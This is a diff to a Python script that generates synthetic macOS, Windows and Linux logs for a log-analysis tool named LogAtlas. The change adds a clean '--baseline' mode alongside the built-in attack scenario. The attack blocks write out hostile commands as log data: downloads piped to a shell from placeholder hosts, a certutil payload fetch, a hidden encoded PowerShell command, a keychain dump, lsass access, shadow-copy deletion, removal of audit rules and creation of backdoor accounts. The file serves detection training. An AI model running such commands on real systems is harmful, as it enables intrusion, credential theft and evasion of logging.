@@ -3,10 +3,12 @@
 со встроенным сценарием атаки. Реальных данных здесь нет: имена хостов и пользователей
 придуманы, внешние адреса взяты из документационных диапазонов RFC 5737.
 
-    python3 scripts/make-demo.py [папка]      # по умолчанию ./demo
+    python3 scripts/make-demo.py [папка]              # по умолчанию ./demo
+    python3 scripts/make-demo.py [папка] --baseline   # «чистая» предыдущая неделя тех же хостов
 
 Создаёт macos-demo.tar.gz, windows-demo.zip и linux-demo.tar.gz — их можно
-сразу загрузить в LogAtlas.
+сразу загрузить в LogAtlas. С --baseline — *-demo-baseline.* без сценария атаки: загрузите их,
+отметьте как эталон хоста и сравните с основными демо-архивами.
 """
 from __future__ import annotations
 
@@ -23,6 +25,8 @@ from datetime import datetime, timedelta
 R = random.Random(42)
 START = datetime(2026, 9, 28)          # понедельник
 DAYS = 7
+CLEAN = False                          # --baseline: без сценария атаки
+SUFFIX = ""
 TZ = timedelta(hours=3)                # часы хостов: UTC+03:00
 
 ATTACKER = "203.0.113.45"
@@ -167,39 +171,40 @@ def make_macos(out):
         WIFI.append((tip, f"{tip.strftime('%a %b %e %H:%M:%S.%f')[:-3]} [airport]/412 @[812.4] (airportProcessCommand.m:520) dq:'com.apple.airportd.server.command.q'/tid[0x1b8666] IP Address: 10.40.2.{R.randint(20, 90)}"))
 
     # --- сценарий: ночь с пятницы на субботу ---------------------------------
-    t0 = START + timedelta(days=4, hours=26, minutes=14)   # сб 02:14
-    pm(t0 - timedelta(minutes=1), "DarkWake", "DarkWake from Deep Idle [CDN] : due to NUB.SPMI0.SW3 RTC/Maintenance")
-    for i in range(9):
-        t = t0 + timedelta(seconds=i * 7)
-        U.append((t, unified_line(t, "/usr/libexec/sshd-session", f"Failed password for anna from {ATTACKER} port {R.randint(40000, 60000)} ssh2", "", "", "Default", 7701 + i, 0)))
-    t = t0 + timedelta(minutes=2)
-    U.append((t, unified_line(t, "/usr/libexec/sshd-session", f"Accepted password for anna from {ATTACKER} port 51022 ssh2", "", "", "Default", 7790, 0)))
-    syslog(t, "sshd-session", "anna [postauth][7790]: USER_PROCESS: 7791 ttys003")
-    cmds = ["/bin/bash -c curl -fsSL http://198.51.100.23/i.sh | sh",
-            "/usr/bin/xattr -d com.apple.quarantine /Users/Shared/.updater",
-            "/bin/launchctl load -w /Library/LaunchDaemons/com.apple.updated.helper.plist",
-            "/usr/bin/security dump-keychain -d /Users/anna/Library/Keychains/login.keychain-db"]
-    for i, c in enumerate(cmds):
-        tc = t + timedelta(minutes=1 + i)
-        syslog(tc, "sudo", f"    anna : TTY=ttys003 ; PWD=/Users/anna ; USER=root ; COMMAND={c}")
-    tp = t + timedelta(minutes=3, seconds=5)
-    ld(tp, "system", "Bootstrapped service from path = /Library/LaunchDaemons/com.apple.updated.helper.plist")
-    for k in range(30):
-        tk = tp + timedelta(minutes=2 * k + 1)
-        ld(tk, "system/com.apple.updated.helper", f"xpcproxy spawned with pid {9100 + k}")
-    mid = "611.7"
-    for line in (f"AUTHREQ_CTX: msgID={mid}, function=TCCAccessRequest, service=kTCCServiceSystemPolicyAllFiles, preflight=no, query=1, client_dict=(null), daemon_dict=<private>",
-                 f"AUTHREQ_ATTRIBUTION: msgID={mid}, attribution={{accessing={{TCCDProcess: identifier=updater, pid=9100, auid=0, euid=0, binary_path=/Users/Shared/.updater}}, }},",
-                 f"AUTHREQ_RESULT: msgID={mid}, authValue=0, authReason=5, authVersion=1, desired_auth=0, error=(null),"):
-        U.append((tp + timedelta(seconds=20), unified_line(tp + timedelta(seconds=20), "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", line, "com.apple.TCC", "access", uid=0)))
-    syslog(t + timedelta(minutes=9), "sshd-session", "anna [postauth][7790]: DEAD_PROCESS: 7791 ttys003")
+    if not CLEAN:
+        t0 = START + timedelta(days=4, hours=26, minutes=14)   # сб 02:14
+        pm(t0 - timedelta(minutes=1), "DarkWake", "DarkWake from Deep Idle [CDN] : due to NUB.SPMI0.SW3 RTC/Maintenance")
+        for i in range(9):
+            t = t0 + timedelta(seconds=i * 7)
+            U.append((t, unified_line(t, "/usr/libexec/sshd-session", f"Failed password for anna from {ATTACKER} port {R.randint(40000, 60000)} ssh2", "", "", "Default", 7701 + i, 0)))
+        t = t0 + timedelta(minutes=2)
+        U.append((t, unified_line(t, "/usr/libexec/sshd-session", f"Accepted password for anna from {ATTACKER} port 51022 ssh2", "", "", "Default", 7790, 0)))
+        syslog(t, "sshd-session", "anna [postauth][7790]: USER_PROCESS: 7791 ttys003")
+        cmds = ["/bin/bash -c curl -fsSL http://198.51.100.23/i.sh | sh",
+                "/usr/bin/xattr -d com.apple.quarantine /Users/Shared/.updater",
+                "/bin/launchctl load -w /Library/LaunchDaemons/com.apple.updated.helper.plist",
+                "/usr/bin/security dump-keychain -d /Users/anna/Library/Keychains/login.keychain-db"]
+        for i, c in enumerate(cmds):
+            tc = t + timedelta(minutes=1 + i)
+            syslog(tc, "sudo", f"    anna : TTY=ttys003 ; PWD=/Users/anna ; USER=root ; COMMAND={c}")
+        tp = t + timedelta(minutes=3, seconds=5)
+        ld(tp, "system", "Bootstrapped service from path = /Library/LaunchDaemons/com.apple.updated.helper.plist")
+        for k in range(30):
+            tk = tp + timedelta(minutes=2 * k + 1)
+            ld(tk, "system/com.apple.updated.helper", f"xpcproxy spawned with pid {9100 + k}")
+        mid = "611.7"
+        for line in (f"AUTHREQ_CTX: msgID={mid}, function=TCCAccessRequest, service=kTCCServiceSystemPolicyAllFiles, preflight=no, query=1, client_dict=(null), daemon_dict=<private>",
+                     f"AUTHREQ_ATTRIBUTION: msgID={mid}, attribution={{accessing={{TCCDProcess: identifier=updater, pid=9100, auid=0, euid=0, binary_path=/Users/Shared/.updater}}, }},",
+                     f"AUTHREQ_RESULT: msgID={mid}, authValue=0, authReason=5, authVersion=1, desired_auth=0, error=(null),"):
+            U.append((tp + timedelta(seconds=20), unified_line(tp + timedelta(seconds=20), "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", line, "com.apple.TCC", "access", uid=0)))
+        syslog(t + timedelta(minutes=9), "sshd-session", "anna [postauth][7790]: DEAD_PROCESS: 7791 ttys003")
     shut = START + timedelta(days=6, hours=20, minutes=11)
     syslog(shut, "shutdown", "SHUTDOWN_TIME: 1791133860 0", 1)
     ld(shut, "system/com.apple.kernelmanagerd", "exited due to exit(0) during system shutdown, ran for 1000ms")
 
     def dump(items):
         return "\n".join(x for _, x in sorted(items, key=lambda a: a[0])) + "\n"
-    pack_tar(os.path.join(out, "macos-demo.tar.gz"), {
+    pack_tar(os.path.join(out, f"macos-demo{SUFFIX}.tar.gz"), {
         "unified.ndjson": dump(U), "var_log/system.log": dump(SYS), "var_log/install.log": dump(INST),
         "pmset.log": "PM ASL data store: /var/log/powermanagement\n" + dump(PM),
         "var_log/com.apple.xpc.launchd/launchd.log": dump(LD), "var_log/wifi.log": dump(WIFI)})
@@ -259,28 +264,29 @@ def make_windows(out):
             E.append(win_ev(day + timedelta(hours=14, minutes=2), 6416, SEC, "Security", {"DeviceDescription": "USB Mass Storage Device (SanDisk Ultra)", "DeviceId": "USB\\VID_0781"}))
 
     # --- сценарий: ночь на четверг, подбор пароля по RDP ----------------------
-    t0 = START + timedelta(days=3, hours=2, minutes=41)
-    E.append(win_ev(t0 - timedelta(minutes=3), 6005, "EventLog", "System", {}))
-    for i in range(42):
-        E.append(win_ev(t0 + timedelta(seconds=i * 4), 4625, SEC, "Security",
-                        {"TargetUserName": R.choice(["administrator", "admin", "m.ivanova", "buh"]), "TargetDomainName": "WS-FIN-12",
-                         "LogonType": "10", "IpAddress": ATTACKER_WIN, "Status": "0xc000006d"}))
-    t = t0 + timedelta(minutes=4)
-    adm = {"SubjectUserName": "administrator", "SubjectDomainName": "WS-FIN-12"}
-    E += [win_ev(t, 4624, SEC, "Security", {"TargetUserName": "administrator", "TargetDomainName": "WS-FIN-12", "LogonType": "10", "IpAddress": ATTACKER_WIN}),
-          win_ev(t + timedelta(seconds=1), 4672, SEC, "Security", adm),
-          win_ev(t + timedelta(minutes=1), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "User": "WS-FIN-12\\administrator", "ParentImage": "C:\\Windows\\explorer.exe"}),
-          win_ev(t + timedelta(minutes=2), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": f"certutil -urlcache -split -f http://{C2}/svc.exe C:\\ProgramData\\svc.exe", "User": "WS-FIN-12\\administrator"}),
-          win_ev(t + timedelta(minutes=2, seconds=30), 3, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\ProgramData\\svc.exe", "DestinationIp": C2, "DestinationPort": "443", "User": "WS-FIN-12\\administrator"}),
-          win_ev(t + timedelta(minutes=3), 4720, SEC, "Security", {"TargetUserName": "support_svc", "TargetDomainName": "WS-FIN-12", **adm}),
-          win_ev(t + timedelta(minutes=3, seconds=20), 4732, SEC, "Security", {"MemberName": "-", "MemberSid": "S-1-5-21-4000-1013", "TargetUserName": "Administrators", "TargetDomainName": "Builtin", **adm}),
-          win_ev(t + timedelta(minutes=4), 7045, "Service Control Manager", "System", {"ServiceName": "WinTelemetrySvc", "ImagePath": "C:\\ProgramData\\svc.exe", "StartType": "auto start", "AccountName": "LocalSystem"}),
-          win_ev(t + timedelta(minutes=5), 4698, SEC, "Security", {"TaskName": "\\Microsoft\\Windows\\Maintenance\\SysCheck", **adm}),
-          win_ev(t + timedelta(minutes=5, seconds=30), 13, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\ProgramData\\svc.exe", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCheck", "User": "WS-FIN-12\\administrator"}),
-          win_ev(t + timedelta(minutes=6), 10, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"SourceImage": "C:\\ProgramData\\svc.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010", "User": "WS-FIN-12\\administrator"}),
-          win_ev(t + timedelta(minutes=6, seconds=10), 1116, "Microsoft-Windows-Windows Defender", "Microsoft-Windows-Windows Defender/Operational", {"Threat Name": "HackTool:Win32/Mimikatz.D", "Path": "file:_C:\\ProgramData\\m64.exe", "Detection User": "WS-FIN-12\\administrator"}, level=3),
-          win_ev(t + timedelta(minutes=7), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet", "User": "WS-FIN-12\\administrator"}),
-          win_ev(t + timedelta(minutes=9), 1102, "Microsoft-Windows-Eventlog", "Security", {"SubjectUserName": "administrator"})]
+    if not CLEAN:
+        t0 = START + timedelta(days=3, hours=2, minutes=41)
+        E.append(win_ev(t0 - timedelta(minutes=3), 6005, "EventLog", "System", {}))
+        for i in range(42):
+            E.append(win_ev(t0 + timedelta(seconds=i * 4), 4625, SEC, "Security",
+                            {"TargetUserName": R.choice(["administrator", "admin", "m.ivanova", "buh"]), "TargetDomainName": "WS-FIN-12",
+                             "LogonType": "10", "IpAddress": ATTACKER_WIN, "Status": "0xc000006d"}))
+        t = t0 + timedelta(minutes=4)
+        adm = {"SubjectUserName": "administrator", "SubjectDomainName": "WS-FIN-12"}
+        E += [win_ev(t, 4624, SEC, "Security", {"TargetUserName": "administrator", "TargetDomainName": "WS-FIN-12", "LogonType": "10", "IpAddress": ATTACKER_WIN}),
+              win_ev(t + timedelta(seconds=1), 4672, SEC, "Security", adm),
+              win_ev(t + timedelta(minutes=1), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "User": "WS-FIN-12\\administrator", "ParentImage": "C:\\Windows\\explorer.exe"}),
+              win_ev(t + timedelta(minutes=2), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": f"certutil -urlcache -split -f http://{C2}/svc.exe C:\\ProgramData\\svc.exe", "User": "WS-FIN-12\\administrator"}),
+              win_ev(t + timedelta(minutes=2, seconds=30), 3, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\ProgramData\\svc.exe", "DestinationIp": C2, "DestinationPort": "443", "User": "WS-FIN-12\\administrator"}),
+              win_ev(t + timedelta(minutes=3), 4720, SEC, "Security", {"TargetUserName": "support_svc", "TargetDomainName": "WS-FIN-12", **adm}),
+              win_ev(t + timedelta(minutes=3, seconds=20), 4732, SEC, "Security", {"MemberName": "-", "MemberSid": "S-1-5-21-4000-1013", "TargetUserName": "Administrators", "TargetDomainName": "Builtin", **adm}),
+              win_ev(t + timedelta(minutes=4), 7045, "Service Control Manager", "System", {"ServiceName": "WinTelemetrySvc", "ImagePath": "C:\\ProgramData\\svc.exe", "StartType": "auto start", "AccountName": "LocalSystem"}),
+              win_ev(t + timedelta(minutes=5), 4698, SEC, "Security", {"TaskName": "\\Microsoft\\Windows\\Maintenance\\SysCheck", **adm}),
+              win_ev(t + timedelta(minutes=5, seconds=30), 13, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\ProgramData\\svc.exe", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCheck", "User": "WS-FIN-12\\administrator"}),
+              win_ev(t + timedelta(minutes=6), 10, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"SourceImage": "C:\\ProgramData\\svc.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010", "User": "WS-FIN-12\\administrator"}),
+              win_ev(t + timedelta(minutes=6, seconds=10), 1116, "Microsoft-Windows-Windows Defender", "Microsoft-Windows-Windows Defender/Operational", {"Threat Name": "HackTool:Win32/Mimikatz.D", "Path": "file:_C:\\ProgramData\\m64.exe", "Detection User": "WS-FIN-12\\administrator"}, level=3),
+              win_ev(t + timedelta(minutes=7), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet", "User": "WS-FIN-12\\administrator"}),
+              win_ev(t + timedelta(minutes=9), 1102, "Microsoft-Windows-Eventlog", "Security", {"SubjectUserName": "administrator"})]
     E.sort(key=lambda x: x[0])
     sec = [x for _, x in E if "<Channel>Security</Channel>" in x]
     rest = [x for _, x in E if "<Channel>Security</Channel>" not in x]
@@ -288,7 +294,7 @@ def make_windows(out):
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
         z.writestr("Security.xml", "\n".join(sec))
         z.writestr("System_Sysmon_Defender.xml", "\n".join(rest))
-    open(os.path.join(out, "windows-demo.zip"), "wb").write(buf.getvalue())
+    open(os.path.join(out, f"windows-demo{SUFFIX}.zip"), "wb").write(buf.getvalue())
     return len(E)
 
 
@@ -356,35 +362,41 @@ def make_linux(out):
             sec(t + timedelta(minutes=3), "dnf", "Installed: htop-3.3.0-1.red80.aarch64")
 
     # --- сценарий: суббота 03:05, вход по украденному ключу ------------------
-    t = START + timedelta(days=5, hours=3, minutes=5)
-    au(t, [("USER_LOGIN", f"pid=7300 uid=0 auid=1000 ses=31 msg='op=login id=1000 exe=\"/usr/sbin/sshd\" hostname={ATTACKER_LIN} addr={ATTACKER_LIN} terminal=/dev/pts/1 res=success'", 'UID="root" AUID="deploy" ID="deploy"')])
-    sec(t, "sshd", f"Accepted publickey for deploy from {ATTACKER_LIN} port 50211 ssh2: ED25519 SHA256:k3yF1ngerpr1nt")
-    execve(t + timedelta(minutes=1), "deploy", 1000, ["bash", "-c", f"curl -s http://{C2}/x.sh | sh"])
-    ts = t + timedelta(minutes=2)
-    sec(ts, "sudo", "  deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysmaint")
-    au(ts, [("USER_CMD", "pid=7400 uid=1000 auid=1000 ses=31 msg='cwd=\"/tmp\" cmd=" + "useradd -m -s /bin/bash sysmaint".encode().hex().upper() + " exe=\"/usr/bin/sudo\" terminal=pts/1 res=success'", 'UID="deploy" AUID="deploy"')])
-    au(ts + timedelta(seconds=1), [("ADD_USER", "pid=7401 uid=0 auid=1000 ses=31 msg='op=add-user acct=\"sysmaint\" exe=\"/usr/sbin/useradd\" hostname=srv-app-02 addr=? terminal=pts/1 res=success'", 'UID="root" AUID="deploy"')])
-    sec(ts + timedelta(seconds=1), "useradd", "new user: name=sysmaint, UID=1002, GID=1002, home=/home/sysmaint, shell=/bin/bash")
-    sec(ts + timedelta(seconds=20), "usermod", "add 'sysmaint' to group 'wheel'")
-    tc = ts + timedelta(minutes=1)
-    au(tc, [("SYSCALL", 'arch=c00000b7 syscall=56 success=yes exit=3 items=2 ppid=7300 pid=7420 auid=1000 uid=0 euid=0 tty=pts1 ses=31 comm="tee" exe="/usr/bin/tee" key="cron"', 'SYSCALL=openat AUID="deploy" UID="root"'),
-            ("PATH", 'item=0 name="/etc/cron.d/" inode=1 nametype=PARENT', None), ("PATH", 'item=1 name="/etc/cron.d/sysupdate" inode=2 nametype=CREATE', None)])
-    au(tc + timedelta(seconds=30), [("SYSCALL", 'arch=c00000b7 syscall=203 success=yes exit=0 items=0 ppid=1 pid=7500 auid=1000 uid=0 tty=(none) ses=31 comm="sh" exe="/usr/bin/bash" key="net"', 'SYSCALL=connect'),
-                                    ("SOCKADDR", "saddr=0200115CC6336417" + "0" * 16, None)])
-    execve(tc + timedelta(minutes=1), "deploy", 0, ["auditctl", "-D"])
-    au(tc + timedelta(minutes=1, seconds=1), [("CONFIG_CHANGE", 'auid=1000 ses=31 op=remove_rule key="exec" list=4 res=1', None)])
-    au(tc + timedelta(minutes=2), [("DAEMON_END", "op=terminate auid=1000 pid=7600 res=success", None)])
-    jr(tc + timedelta(minutes=2), "systemd", "Stopped auditd.service - Security Auditing Service.")
+    if not CLEAN:
+        t = START + timedelta(days=5, hours=3, minutes=5)
+        au(t, [("USER_LOGIN", f"pid=7300 uid=0 auid=1000 ses=31 msg='op=login id=1000 exe=\"/usr/sbin/sshd\" hostname={ATTACKER_LIN} addr={ATTACKER_LIN} terminal=/dev/pts/1 res=success'", 'UID="root" AUID="deploy" ID="deploy"')])
+        sec(t, "sshd", f"Accepted publickey for deploy from {ATTACKER_LIN} port 50211 ssh2: ED25519 SHA256:k3yF1ngerpr1nt")
+        execve(t + timedelta(minutes=1), "deploy", 1000, ["bash", "-c", f"curl -s http://{C2}/x.sh | sh"])
+        ts = t + timedelta(minutes=2)
+        sec(ts, "sudo", "  deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysmaint")
+        au(ts, [("USER_CMD", "pid=7400 uid=1000 auid=1000 ses=31 msg='cwd=\"/tmp\" cmd=" + "useradd -m -s /bin/bash sysmaint".encode().hex().upper() + " exe=\"/usr/bin/sudo\" terminal=pts/1 res=success'", 'UID="deploy" AUID="deploy"')])
+        au(ts + timedelta(seconds=1), [("ADD_USER", "pid=7401 uid=0 auid=1000 ses=31 msg='op=add-user acct=\"sysmaint\" exe=\"/usr/sbin/useradd\" hostname=srv-app-02 addr=? terminal=pts/1 res=success'", 'UID="root" AUID="deploy"')])
+        sec(ts + timedelta(seconds=1), "useradd", "new user: name=sysmaint, UID=1002, GID=1002, home=/home/sysmaint, shell=/bin/bash")
+        sec(ts + timedelta(seconds=20), "usermod", "add 'sysmaint' to group 'wheel'")
+        tc = ts + timedelta(minutes=1)
+        au(tc, [("SYSCALL", 'arch=c00000b7 syscall=56 success=yes exit=3 items=2 ppid=7300 pid=7420 auid=1000 uid=0 euid=0 tty=pts1 ses=31 comm="tee" exe="/usr/bin/tee" key="cron"', 'SYSCALL=openat AUID="deploy" UID="root"'),
+                ("PATH", 'item=0 name="/etc/cron.d/" inode=1 nametype=PARENT', None), ("PATH", 'item=1 name="/etc/cron.d/sysupdate" inode=2 nametype=CREATE', None)])
+        au(tc + timedelta(seconds=30), [("SYSCALL", 'arch=c00000b7 syscall=203 success=yes exit=0 items=0 ppid=1 pid=7500 auid=1000 uid=0 tty=(none) ses=31 comm="sh" exe="/usr/bin/bash" key="net"', 'SYSCALL=connect'),
+                                        ("SOCKADDR", "saddr=0200115CC6336417" + "0" * 16, None)])
+        execve(tc + timedelta(minutes=1), "deploy", 0, ["auditctl", "-D"])
+        au(tc + timedelta(minutes=1, seconds=1), [("CONFIG_CHANGE", 'auid=1000 ses=31 op=remove_rule key="exec" list=4 res=1', None)])
+        au(tc + timedelta(minutes=2), [("DAEMON_END", "op=terminate auid=1000 pid=7600 res=success", None)])
+        jr(tc + timedelta(minutes=2), "systemd", "Stopped auditd.service - Security Auditing Service.")
 
     def dump(items):
         return "\n".join(x for _, x in sorted(items, key=lambda a: a[0])) + "\n"
-    pack_tar(os.path.join(out, "linux-demo.tar.gz"), {"var/log/audit/audit.log": dump(A), "var/log/secure": dump(SECL),
+    pack_tar(os.path.join(out, f"linux-demo{SUFFIX}.tar.gz"), {"var/log/audit/audit.log": dump(A), "var/log/secure": dump(SECL),
                                                       "journal.json": dump(J)})
     return len(A) + len(SECL) + len(J)
 
 
 if __name__ == "__main__":
-    out = sys.argv[1] if len(sys.argv) > 1 else "demo"
+    args = [a for a in sys.argv[1:] if not a.startswith("--")]
+    if "--baseline" in sys.argv:
+        CLEAN, SUFFIX = True, "-baseline"
+        START -= timedelta(days=DAYS)
+        R.seed(7)
+    out = args[0] if args else "demo"
     os.makedirs(out, exist_ok=True)
     for name, fn in (("macOS", make_macos), ("Windows", make_windows), ("Linux", make_linux)):
         print(f"{name}: {fn(out)} записей")
